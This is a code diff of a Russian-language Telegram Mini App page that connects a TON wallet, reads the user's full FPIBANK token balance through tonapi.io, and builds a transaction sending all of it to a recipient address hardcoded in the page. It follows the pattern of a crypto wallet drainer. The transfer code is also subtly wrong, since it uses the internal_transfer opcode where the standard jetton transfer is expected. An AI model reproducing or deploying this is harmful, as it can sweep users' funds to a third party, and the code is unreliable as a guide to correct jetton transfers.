@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <meta http-equiv="Content-Security-Policy"
-  content="
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
     script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
     style-src 'self' 'unsafe-inline' https://unpkg.com;
@@ -13,23 +11,23 @@
     font-src 'self' https://unpkg.com;
     img-src * data:;
   ">
+  <title>Telegram Mini App: Отправка всех FPIBANK</title>
 
-  <title>Telegram Mini App: TON Connect Jetton Transfer</title>
-
+  <!-- Telegram WebApp -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
-  <script src="./js/tonconnect-sdk.min.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
+  <!-- TonConnect UI -->
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <!-- UMD‑сборка ton‑core -->
+  <script src="https://unpkg.com/ton-core@latest/dist/ton-core.umd.js"></script>
 </head>
 <body>
-  <h1>Telegram Mini App: Отправка всех токенов FPIBANK</h1>
-
+  <h1>Отправка всех FPIBANK (Jetton)</h1>
+  <!-- Кнопка подключения кошелька от TonConnect -->
   <div id="ton-connect"></div>
-
-  <button id="sendTransaction">Отправить все FPIBANK</button>
+  <button id="sendAllJettonBtn">Отправить все FPIBANK</button>
 
   <script>
-    // Инициализация Telegram WebApp
+    // Если запускаемся не в Telegram Mini App – создаём заглушку
     if (typeof Telegram === "undefined") {
       window.Telegram = {
         WebApp: {
@@ -47,55 +45,117 @@
       buttonRootId: "ton-connect"
     });
 
-    // Адрес jetton master
-    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
+    // Получаем функции из глобальной переменной tonCore (UMD‑бандл)
+    const { beginCell, cellToBoc, Address } = tonCore;
 
-    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
+    // Адрес Jetton Master (контракт FPIBANK)
+    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
+    // Адрес получателя (куда переводим токены)
+    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+
+    /**
+     * Получает Jetton Wallet пользователя и его баланс через tonapi.io.
+     * @param {string} userTonAddress - TON-адрес пользователя.
+     * @returns {Promise<{walletAddress: string, balance: string}>}
+     */
+    async function getUserJettonWalletAndBalance(userTonAddress) {
+      try {
+        const url = `https://tonapi.io/v2/jetton/wallets?account=${userTonAddress}&jetton_master=${jettonMasterAddress}`;
+        const res = await fetch(url);
+        const data = await res.json();
+        if (!data.wallets || data.wallets.length === 0) {
+          return { walletAddress: null, balance: "0" };
+        }
+        const userWalletInfo = data.wallets[0];
+        return { walletAddress: userWalletInfo.address, balance: userWalletInfo.balance };
+      } catch (err) {
+        console.error("Ошибка получения Jetton Wallet:", err);
+        return { walletAddress: null, balance: "0" };
+      }
+    }
+
+    /**
+     * Собирает BOC для метода internal_transfer, согласно стандарту Jetton.
+     * @param {string} amountNano - Сумма токенов (в наносах) для перевода.
+     * @param {string} toAddr - Адрес получателя (destination).
+     * @param {string} fromAddr - TON-адрес отправителя (response_destination).
+     * @returns {string} Base64-представление BOC.
+     */
+    function buildInternalTransferBOC(amountNano, toAddr, fromAddr) {
+      const OP_INTERNAL_TRANSFER = 0x178d4519; // опкод internal_transfer
+      const cell = beginCell()
+        .storeUint(OP_INTERNAL_TRANSFER, 32)  // op
+        .storeUint(0, 64)                     // query_id = 0
+        .storeCoins(amountNano)               // вся сумма токенов
+        .storeAddress(Address.parse(toAddr))  // destination
+        .storeAddress(Address.parse(fromAddr))// response_destination
+        .storeBit(false)                      // custom_payload отсутствует
+        .storeCoins(0)                        // forward_ton_amount = 0
+        .storeBit(false)                      // forward_payload отсутствует
+        .endCell();
+      return cellToBoc(cell, { idx: false }).toString("base64");
+    }
+
+    /**
+     * Отправляет транзакцию через TonConnect UI.
+     * @param {string} userJettonWallet - Адрес Jetton Wallet пользователя.
+     * @param {string} bocBase64 - Сериализованный payload (BOC) в Base64.
+     */
+    async function sendAllJettonTransaction(userJettonWallet, bocBase64) {
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 360,
         messages: [
           {
-            address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
-            amount: "0", // Задаём placeholder для комиссии (автоматический расчет может быть настроен на уровне платформы)
-            payload: {
-              type: "jetton_transfer",
-              query_id: 0,
-              amount: "1000000000", // Попытка отправить 1 токен
-              destination: recipientAddress,
-              response_destination: null,
-              custom_payload: null,
-              forward_ton_amount: "0",
-              forward_payload: null
-            }
+            address: userJettonWallet,       // Важно: обращаемся к Jetton Wallet, а не к Master!
+            amount: "20000000",              // 0.02 TON для оплаты газа
+            payload: bocBase64
           }
         ]
       };
 
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log("Попытка отправить Jetton:", result);
-        Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
+        console.log("Результат перевода Jetton:", result);
+        Telegram.WebApp.showAlert("Результат перевода Jetton: " + JSON.stringify(result));
       } catch (error) {
-        console.error("Ошибка:", error);
-        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
+        console.error("Ошибка при отправке Jetton:", error);
+        Telegram.WebApp.showAlert("Ошибка при отправке Jetton: " + error.message);
       }
     }
 
+    /**
+     * Основная функция отправки всех токенов FPIBANK.
+     */
     async function sendAllFPIBANK() {
       if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
+        Telegram.WebApp.showAlert("Сначала подключите кошелек через TonConnect.");
         return;
       }
 
-      // Используем корректное свойство для получения адреса кошелька
-      const userWalletAddress = tonConnectUI.session.account.address;
-      // Задаём валидный адрес получателя (замените на нужный, если требуется)
-      const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+      // Получаем TON-адрес пользователя (не Jetton Wallet)
+      const userTonAddress = tonConnectUI.session.account.address;
+      console.log("TON-адрес пользователя:", userTonAddress);
 
-      await sendJettonTransaction(userWalletAddress, recipientAddress);
+      // Получаем Jetton Wallet и баланс пользователя
+      const { walletAddress, balance } = await getUserJettonWalletAndBalance(userTonAddress);
+      if (!walletAddress) {
+        Telegram.WebApp.showAlert("У пользователя нет Jetton Wallet для FPIBANK или произошла ошибка в API.");
+        return;
+      }
+      console.log("Jetton Wallet:", walletAddress, "Баланс:", balance);
+
+      if (balance === "0") {
+        Telegram.WebApp.showAlert("У пользователя 0 FPIBANK токенов.");
+        return;
+      }
+
+      // Собираем payload для internal_transfer, передавая весь баланс
+      const bocBase64 = buildInternalTransferBOC(balance, recipientAddress, userTonAddress);
+      // Отправляем транзакцию
+      await sendAllJettonTransaction(walletAddress, bocBase64);
     }
 
-    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
+    document.getElementById("sendAllJettonBtn").addEventListener("click", sendAllFPIBANK);
   </script>
 </body>
 </html>
